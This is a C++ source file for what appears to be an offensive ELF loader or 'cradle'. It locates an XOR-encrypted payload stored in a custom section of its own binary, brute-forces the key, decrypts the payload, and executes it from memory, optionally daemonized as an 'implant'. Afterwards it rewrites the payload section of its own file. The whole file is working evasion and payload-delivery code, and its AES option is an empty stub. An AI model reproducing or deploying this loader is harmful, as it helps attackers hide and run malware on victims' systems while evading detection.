#include <elfldr.h>

using namespace std;
using namespace ELFIO;

int main(int argc, char **argv) {

    char *psec_name = (char *) PSEC_NAME;
    char *ksec_name = (char *) KSEC_NAME;
    unsigned int psec_num = 0, ksec_num = 0;
    unsigned long psec_size = 0, ksec_size = 0;

    void *key_data = nullptr;
    void *algo_data = nullptr;
    void *p_data = nullptr;

    Elf_Word key_data_sz, algo_data_sz, p_data_sz;
    elfio reader;

    bool do_daemon = false;
    bool exec_memfd = false;

    char **new_argv = nullptr;

    // Process options, separate callee options from caller ( '--' )
    int m, n, l, ch, a = 0;

    for (n = 1; n < argc; n++)            /* Scan through args. */
    {
        switch ((int) argv[n][0])            /* Check for option character. */
        {
            case '-':
                l = (int) strlen(argv[n]);
                for (m = 1; m < l; ++m) /* Scan through valid options. */
                {
                    ch = (int) (unsigned char) argv[n][m];
                    switch (ch) {
                        case 'd':
                            debug_print("Option: daemonize %c\n", ch);
                            do_daemon = true;
                            break;
                        case 'm':
                            debug_print("Option: memfd_fallback %c\n", ch);
                            exec_memfd = true;
                            break;
                        case '-':
                            debug_print("Option: double dash %c\n", ch);
                            // End opts, skip counting
                            ++a;
                            goto end_opts;
                        default:
                            err(EXIT_FAILURE, "Illegal option in command %c\n", ch);
                            break;
                    }
                }
                break;
            default:
                break;
        }
        ++a; // increment cradle args processed
    }

    end_opts:

    set_exec_args(&new_argv, &argv, argc, a);

    // What is our path (use /proc, assuming it's available)
    filesystem::path my_path = get_executable_path();

    // Load host ELF data
    if (!reader.load(my_path)) {
        cerr << "Can't find or process src ELF file: " << argv[0] << endl;
        exit(AFAULT);
    }

    // Find section with keys and algo
    if (find_section_by_name(reader, ksec_name, &ksec_num, &ksec_size) == TRUE) {
        cout << "Found section " << ksec_name << " at position " << ksec_num << " of size: " << ksec_size << endl;
        if (get_ksection_data(reader, ksec_num, &key_data, &key_data_sz, &algo_data, &algo_data_sz) == TRUE) {

            // Find section with data
            if (find_section_by_name(reader, psec_name, &psec_num, &psec_size) == TRUE) {
                cout << "Found section " << psec_name << " at position " << psec_num << " of size: " << psec_size
                     << endl;
                if (get_psection_data(reader, psec_num, &p_data, &p_data_sz) == TRUE) {

                    // Working with key data
                    if (strcmp((char *) algo_data, "X") == 0) {
                        // We are in XOR algo

                        // Find decryption key via bruteforce on key space
                        unsigned int k = find_x_key(&key_data);
                        if (k == 0) {
                            err(EXIT_FAILURE, "Keyspace does not contain key");
                        }
                        cout << "Key found: (0x)" << hex << k << endl;

                        // un-XOR buffer
                        uxor_buffer((unsigned char **) (&p_data), (unsigned long) p_data_sz, k);

#if DEBUG_PAYDUMPF == 1
                        cout << "Dumping to disk ... " << endl;
                        dump_buffer(p_data, p_data_sz, (char *) PAYDUMPF);
#endif

                    } else if (strcmp((char *) algo_data, "A") == 0) {
                        // AES ...
                        ;
                    } else /* default: */
                    {
                        err(EXIT_FAILURE, "%s not in algo choices <X|A>", (char *) algo_data);
                    }


                    // Handling launch context: stay foreground (simple command), or background it (e.g. implant)
                    if (do_daemon) {
                        debug_print("%s\n", "Load_exec daemonized");
                        // Passing load_exec function w/parameters to daemonizer
                        daemonize(
                                (mem_exec) (load_exec), exec_memfd, (unsigned char const *) p_data, &new_argv);
                    } else {
                        debug_print("%s\n", "Load_exec no daemon");
                        load_exec(exec_memfd, (unsigned char const *) p_data, &new_argv);
                    }

                    set_psection_data(reader, psec_num, psec_size, my_path.c_str() );
                } else {
                    err(EXIT_FAILURE, "Data context cannot be retrieved for psec_num %d ", psec_num);
                }
            } else {
                // Section not properly setup
                err(EXIT_FAILURE, "%s not found, last seen sec num: %d", ksec_name, ksec_num);
            }

        } else {
            err(EXIT_FAILURE, "Key context cannot be retrieved for ksec_num %d ", ksec_num);
        }

    } else {
        // Section not properly setup
        err(EXIT_FAILURE, "%s not found, last seen sec num: %d", ksec_name, ksec_num);
    }

    return 0;
}